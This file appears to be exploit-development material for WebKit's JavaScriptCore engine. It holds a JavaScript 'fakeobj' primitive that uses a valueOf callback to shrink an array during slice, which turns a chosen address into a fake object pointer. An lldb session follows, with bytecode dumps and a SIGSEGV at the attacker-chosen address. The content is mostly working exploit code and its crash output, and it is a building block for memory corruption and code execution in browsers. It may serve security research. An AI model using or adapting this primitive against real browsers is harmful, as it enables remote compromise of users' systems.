function fakeobj(addr) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push({});     // Array must be of type ArrayWithContiguous

    // addr = addr.asDouble();
    var hax = {valueOf: function() {
        a.length = 0;
        a = [addr];
        return 4;
    }};

    return a.slice(0, hax)[3];
}

// 0x0000000041414141
var x = fakeobj(5.40900888e-315);
print(x);

/*
root@07c56b71a78f:/tools/JavaScriptCore# lldb ./WebKitBuild/Debug/bin/jsc -- --dumpGeneratedBytecodes=true /tmp/fakeobj.js 
(lldb) target create "./WebKitBuild/Debug/bin/jsc"
Current executable set to './WebKitBuild/Debug/bin/jsc' (x86_64).
(lldb) settings set -- target.run-args  "--dumpGeneratedBytecodes=true" "/tmp/fakeobj.js"
(lldb) rt
error: 'rt' is not a valid command.
error: Unrecognized command 'rt'.
(lldb) r
Process 144035 launched: './WebKitBuild/Debug/bin/jsc' (x86_64)
<global>#C3fKrD:[0x7f1d3639bc80->0x7f1d363fbf70, NoneGlobal, 112]: 112 m_instructions; 896 bytes; 1 parameter(s); 16 callee register(s); 5 variable(s)
[   0] enter             
[   1] get_scope         loc3
[   3] mov               loc4, loc3
[   6] new_func          loc5, loc3, f0
[  10] resolve_scope     loc6, loc3, fakeobj(@id0), <GlobalVar>, 1, 0x7f1d363e7900
[  17] mov               loc7, loc6
[  20] put_to_scope      loc7, fakeobj(@id0), loc5, 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, <structure>, 2012858152
[  27] mov               loc5, Undefined(const0)
[  30] resolve_scope     loc6, loc3, x(@id1), <GlobalVar>, 1, 0x7f1d363e7900
[  37] resolve_scope     loc10, loc3, fakeobj(@id0), <GlobalVar>, 1, 0x7f1d363e7900
[  44] get_from_scope    loc7, loc10, fakeobj(@id0), 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, 2012858152    predicting None
[  52] mov               loc9, Double: 1094795585, 0.000000(const1)
[  55] call              loc7, loc7, 2, 16 status(Could Take Slow Path)    Original; predicting None
[  64] put_to_scope      loc6, x(@id1), loc7, 1048577<DoNotThrowIfNotFound|GlobalVar|Initialization>, <structure>, 2012858160
[  71] resolve_scope     loc10, loc3, print(@id2), <GlobalProperty>, 1, 0x7f1d363e7900
[  78] get_from_scope    loc6, loc10, print(@id2), 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 152    predicting None
[  86] resolve_scope     loc9, loc3, x(@id1), <GlobalVar>, 1, 0x7f1d363e7900
[  93] get_from_scope    loc9, loc9, x(@id1), 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, 2012858160    predicting None
[ 101] call              loc5, loc6, 2, 16 status(Could Take Slow Path)    Original; predicting None
[ 110] end               loc5

Identifiers:
  id0 = fakeobj
  id1 = x
  id2 = print

Constants:
   k0 = Undefined
   k1 = Double: 1094795585, 0.000000: in source as double

fakeobj#Ar95Bl:[0x7f1d3639ba60->0x7f1d363c8b50, NoneFunctionCall, 137]: 137 m_instructions; 1096 bytes; 2 parameter(s); 18 callee register(s); 9 variable(s)
[   0] enter             
[   1] get_scope         loc3
[   3] mov               loc4, loc3
[   6] create_lexical_environment loc5, loc3, Cell: 0x7f1d363e3dd0 (0x7f1d363f7700:[SymbolTable, {}, NonArray, Leaf]), ID: 18(const0), Undefined(const1)
[  11] mov               loc3, loc5
[  14] put_to_scope      loc5, addr(@id0), arg1, 2052<ThrowIfNotFound|LocalClosureVar|NotInitialization>, <structure>, 0
[  21] new_array         loc9, head0, 0
[  26] put_to_scope      loc5, a(@id1), loc9, 1048580<DoNotThrowIfNotFound|LocalClosureVar|Initialization>, <structure>, 1
[  33] mov               loc7, Int32: 0(const2)
[  36] jnless            loc7, Int32: 100(const3), 41(->77)
[  40] loop_hint         
[  41] get_from_scope    loc12, loc5, a(@id1), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 1    predicting None
[  49] get_by_id         loc9, loc12, push(@id2)    predicting None
[  58] new_object        loc11, 0
[  62] call              loc9, loc9, 2, 18 status(Could Take Slow Path)    Original; predicting None
[  71] inc               loc7
[  73] jless             loc7, Int32: 100(const3), -33(->40)
[  77] new_object        loc9, 1
[  81] new_func_exp      loc10, loc3, f0
[  85] put_by_id         loc9, valueOf(@id3), loc10, IsDirect|Bottom
[  94] mov               loc6, loc9
[  97] get_from_scope    loc12, loc5, a(@id1), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 1    predicting None
[ 105] get_by_id         loc9, loc12, slice(@id4)    predicting None
[ 114] mov               loc11, Int32: 0(const2)
[ 117] mov               loc10, loc6
[ 120] call              loc9, loc9, 3, 18 status(Could Take Slow Path)    Original; predicting None
[ 129] get_by_val        loc9, loc9, Int32: 3(const4)    Original; predicting None
[ 135] ret               loc9

Identifiers:
  id0 = addr
  id1 = a
  id2 = push
  id3 = valueOf
  id4 = slice

Constants:
   k0 = Cell: 0x7f1d363e3dd0 (0x7f1d363f7700:[SymbolTable, {}, NonArray, Leaf]), ID: 18
   k1 = Undefined
   k2 = Int32: 0: in source as integer
   k3 = Int32: 100: in source as integer
   k4 = Int32: 3: in source as integer

valueOf#ASM3QO:[0x7f1d3639b840->0x7f1d363c8aa0, NoneFunctionCall, 66]: 66 m_instructions; 528 bytes; 1 parameter(s); 8 callee register(s); 6 variable(s)
[   0] enter             
[   1] get_scope         loc3
[   3] mov               loc4, loc3
[   6] resolve_scope     loc6, loc3, a(@id0), <ClosureVar>, 0, 0x7f1d363e3dd0
[  13] get_from_scope    loc7, loc6, a(@id0), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 1    predicting None
[  21] put_by_id         loc7, length(@id1), Int32: 0(const1), Bottom
[  30] resolve_scope     loc6, loc3, a(@id0), <ClosureVar>, 0, 0x7f1d363e3dd0
[  37] resolve_scope     loc7, loc3, addr(@id2), <ClosureVar>, 0, 0x7f1d363e3dd0
[  44] get_from_scope    loc7, loc7, addr(@id2), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 0    predicting None
[  52] new_array         loc7, loc7, 1
[  57] put_to_scope      loc6, a(@id0), loc7, 1050627<DoNotThrowIfNotFound|ClosureVar|NotInitialization>, <structure>, 1
[  64] ret               Int32: 4(const2)

Identifiers:
  id0 = a
  id1 = length
  id2 = addr

Constants:
   k0 = Cell: 0x7f1d363e3cf0 (0x7f1d363f7700:[SymbolTable, {}, NonArray, Leaf]), ID: 18
   k1 = Int32: 0: in source as integer
   k2 = Int32: 4: in source as integer

Process 144035 stopped
* thread #1: tid = 144035, 0x000000000043addc jsc`JSC::WeakSet::heap(this=0x00000000414140c8) const + 12 at VM.h:703, name = 'jsc', stop reason = signal SIGSEGV: invalid address (fault address: 0x414140e8)
    frame #0: 0x000000000043addc jsc`JSC::WeakSet::heap(this=0x00000000414140c8) const + 12 at VM.h:703
   700 
   701  inline Heap* WeakSet::heap() const
   702  {
-> 703      return &m_vm->heap;
   704  }
   705 
   706  #if ENABLE(JIT)
(lldb) bt
* thread #1: tid = 144035, 0x000000000043addc jsc`JSC::WeakSet::heap(this=0x00000000414140c8) const + 12 at VM.h:703, name = 'jsc', stop reason = signal SIGSEGV: invalid address (fault address: 0x414140e8)
  * frame #0: 0x000000000043addc jsc`JSC::WeakSet::heap(this=0x00000000414140c8) const + 12 at VM.h:703
    frame #1: 0x000000000043adbc jsc`JSC::MarkedBlock::heap(this=0x0000000041414000) const + 28 at MarkedBlock.h:245
    frame #2: 0x000000000043ad8d jsc`JSC::Heap::heap(cell=0x0000000041414141) + 29 at HeapInlines.h:63
    frame #3: 0x00000000004405db jsc`JSC::Heap::heap(v=const JSC::JSValue @ 0x00007ffcc3475ac0) + 59 at HeapInlines.h:70
    frame #4: 0x00007f1d7d58f84d libJavaScriptCore.so.1`JSC::JSGlobalObject::put(cell=0x00007f1d363e7900, exec=0x00007ffcc3475e20, propertyName=PropertyName @ 0x00007ffcc3475b80, value=JSValue @ 0x00007ffcc3475b78, slot=0x00007ffcc3475c78) + 61 at JSGlobalObject.cpp:705
    frame #5: 0x00007f1d7d377a98 libJavaScriptCore.so.1`::llint_slow_path_put_to_scope(exec=0x00007ffcc3475e20, pc=0x00007f1d77fd65c8) + 1384 at LLIntSlowPaths.cpp:1498
    frame #6: 0x00007f1d7d37fa4f libJavaScriptCore.so.1`llint_entry + 20883
    frame #7: 0x00007f1d7d37a6a6 libJavaScriptCore.so.1`llintPCRangeStart + 334
    frame #8: 0x00007f1d7d316c77 libJavaScriptCore.so.1`JSC::JITCode::execute(this=0x00007f1d77f99528, vm=0x00007f1d37bf1000, protoCallFrame=0x00007ffcc3476330) + 215 at JITCode.cpp:80
    frame #9: 0x00007f1d7d2d469f libJavaScriptCore.so.1`JSC::Interpreter::execute(this=0x00007f1d77fed058, program=0x00007f1d363fbf70, callFrame=0x00007f1d363e7940, thisObj=0x00007f1d363ba3a0) + 6127 at Interpreter.cpp:960
    frame #10: 0x00007f1d7d50b6f0 libJavaScriptCore.so.1`JSC::evaluate(exec=0x00007f1d363e7940, source=0x00007ffcc34779e8, thisValue=JSValue @ 0x00007ffcc3477860, returnedException=0x00007ffcc3477a08) + 816 at Completion.cpp:106
    frame #11: 0x0000000000429267 jsc`runWithScripts(globalObject=0x00007f1d363e7900, scripts=0x00007ffcc3477dc0, dump=false, module=false) + 1591 at jsc.cpp:2011
    frame #12: 0x000000000042848f jsc`runJSC(vm=0x00007f1d37bf1000, options=CommandLine @ 0x00007ffcc3477db8) + 367 at jsc.cpp:2233
    frame #13: 0x00000000004279be jsc`jscmain(argc=3, argv=0x00007ffcc3477f88) + 158 at jsc.cpp:2284
    frame #14: 0x000000000042788b jsc`main(argc=3, argv=0x00007ffcc3477f88) + 187 at jsc.cpp:1938
    frame #15: 0x00007f1d7a231840 libc.so.6`__libc_start_main(main=(jsc`main at jsc.cpp:1885), argc=3, argv=0x00007ffcc3477f88, init=<unavailable>, fini=<unavailable>, rtld_fini=<unavailable>, stack_end=0x00007ffcc3477f78) + 240 at libc-start.c:291
    frame #16: 0x0000000000425fa9 jsc`_start + 41
*/